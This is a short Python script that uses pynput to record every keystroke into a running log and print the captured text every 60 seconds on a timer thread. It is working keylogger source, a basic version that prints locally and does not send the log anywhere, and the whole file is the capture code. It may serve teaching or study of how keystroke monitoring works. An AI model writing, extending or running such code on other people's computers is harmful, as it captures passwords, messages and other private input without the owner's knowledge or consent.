# encoding=utf8
import pynput.keyboard
import threading
# for multi-threading

log = ""


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    

    timer = threading.Timer(60, report)
    # timer will run on separate thread and will call report() module after every 60 seconds
    
    timer.start()
    # timer will start


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()